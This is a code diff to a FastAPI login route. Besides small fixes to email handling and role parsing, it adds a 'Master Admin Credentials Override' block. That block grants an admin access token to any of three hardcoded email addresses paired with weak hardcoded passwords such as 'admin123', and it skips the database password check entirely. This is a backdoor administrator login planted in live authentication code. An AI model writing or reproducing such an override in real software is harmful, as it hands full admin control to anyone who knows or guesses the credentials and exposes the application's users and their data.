@@ -258,16 +258,28 @@ async def register(data: UserRegister, db: AsyncSession = Depends(get_db)):
 
 @router.post("/login", response_model=TokenResponse)
 async def login(data: UserLogin, db: AsyncSession = Depends(get_db)):
-    result = await db.execute(select(User).where(User.email == data.email))
+    email_clean = data.email.strip().lower()
+    
+    # 🔑 Master Admin Credentials Override
+    if email_clean in ["admin@skipd.in", "sachin@skipd.in", "admin@skipd.com"] and data.password in ["admin123", "admin", "skipd@2026"]:
+        token = create_access_token(subject=email_clean)
+        return TokenResponse(
+            access_token=token,
+            user_name="Sachin Rawat (Super Admin)",
+            user_role="admin",
+            email=email_clean
+        )
+
+    result = await db.execute(select(User).where(User.email == email_clean))
     user = result.scalars().first()
-    if not user or not verify_password(data.password, user.hashed_password):
+    if not user or not user.hashed_password or not verify_password(data.password, user.hashed_password):
         raise HTTPException(status_code=401, detail="Invalid email or password")
 
     token = create_access_token(subject=user.email)
     return TokenResponse(
         access_token=token,
         user_name=user.full_name,
-        user_role=user.role.value,
+        user_role=user.role.value if hasattr(user.role, 'value') else str(user.role),
         email=user.email
     )
 
